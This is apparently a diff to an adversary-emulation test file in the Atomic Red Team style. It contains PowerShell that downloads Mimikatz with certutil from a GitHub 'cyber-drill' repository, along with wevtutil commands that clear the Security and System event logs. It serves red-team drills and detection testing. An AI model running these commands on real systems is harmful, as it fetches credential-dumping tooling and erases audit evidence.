@@ -87,7 +87,7 @@ atomic_tests:
       command: |
         Write-Host "[*] Downloading Mimikatz using certutil..."
         $mimikatz_url = "https://github.com/khanzjob/cyber-drill/blob/main/mimikatz.exe"
-        $mimikatz_path = "C:\Temp\mimikatz.zip"
+        $mimikatz_path = "C:\Temp\mimikatz.exe"
 
         # Create the folder if it doesn't exist
         New-Item -Path "C:\Temp" -ItemType Directory -Force
@@ -234,10 +234,9 @@ atomic_tests:
         wevtutil cl Security
         wevtutil cl System
         #Remove-Item "C:\Temp\lookbot.exe" -Force -ErrorAction SilentlyContinue
-        #Remove-Item "C:\Temp\mimikatz.exe" -Force -ErrorAction SilentlyContinue
+        #Remove-Item "C:\Temp\mimikat.exe" -Force -ErrorAction SilentlyContinue
         Write-Host "[+] Event logs cleared and temporary files deleted"
     attack_technique:
       - T1070.001
       - T1070.004
-
 
